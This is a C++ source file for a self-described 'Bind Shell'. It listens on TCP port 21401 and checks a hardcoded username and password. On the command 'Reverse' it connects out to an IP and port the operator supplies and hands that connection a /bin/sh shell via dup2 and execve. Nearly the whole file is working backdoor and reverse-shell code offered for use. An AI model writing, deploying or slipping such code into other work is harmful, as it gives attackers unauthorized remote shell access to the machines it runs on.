#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string>
#include <string.h>
#include <unistd.h>

using namespace std;


string messages_[] = {
                      "\t\tHello In My World\n \t\tHer The Bind Shell\n\t\t 'Just For Fun'\n\n",
                      "  Login Please\n USeR: ",
                      " Pass: ",
                      "To Reverse Shell Enter\n Ip: ",
                      " Port: "
                     };
int login_auth(string Password,string User){
        if(strcmp(User.c_str(),"AXO\n"))
                return 0;
        if(!strcmp(Password.c_str(),"HelloWorld\n"))
                return 1;

        return 0;
}


int login(int sock){
    char buff[4096];
    int recv_length;


    send(sock,messages_[0].c_str(),messages_[0].length(),0);
    send(sock,messages_[1].c_str(),messages_[1].length(),0);

    recv_length = recv(sock,buff,4096,0);
    string User(buff,recv_length);



    send(sock,messages_[2].c_str(),messages_[2].length(),0);

    recv_length = recv(sock,buff,4096,0);
    string PAss(buff,recv_length);
    if(login_auth(PAss,User))
	return 1;

    return 0;
}

int write_me(char* buff,int size){
    for(int i=0;i<size;i++){
        putc(buff[i],stdout);
    }
}

int Reverse_Shell(int sock){
    char port[6];
    char ip[16];

    send(sock,messages_[3].c_str(),messages_[3].size(),0);
    recv(sock,ip,15,0);

    send(sock,messages_[4].c_str(),messages_[4].size(),0);
    recv(sock,port,6,0);

    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(atoi(port));
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;

}

int main()
{
    sockaddr_in hint;
    hint.sin_addr.s_addr = INADDR_ANY;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(21401);
    int sock;
    sock = socket(AF_INET,SOCK_STREAM,0);
main_:

    cout<<"you her"<<endl;

    bind(sock,(sockaddr*)&hint,sizeof(hint));

    listen(sock,1);

    int accept_ = accept(sock,0,0);

    char buff[4096+1];

    if(!login(accept_)){
        close(accept_);
        goto main_;
    }
    while(1){
        send(accept_,"#",1,0);
        int recv_size = recv(accept_,buff,4096,0);
        write_me(buff,recv_size);
        if(!strcmp(buff,"Reverse\n"))
            Reverse_Shell(accept_);
        if(recv_size<1){
            close(accept_);
            cout<<"Deconnected From It"<<endl;
            goto main_;
        }
    }
    return 0;
}
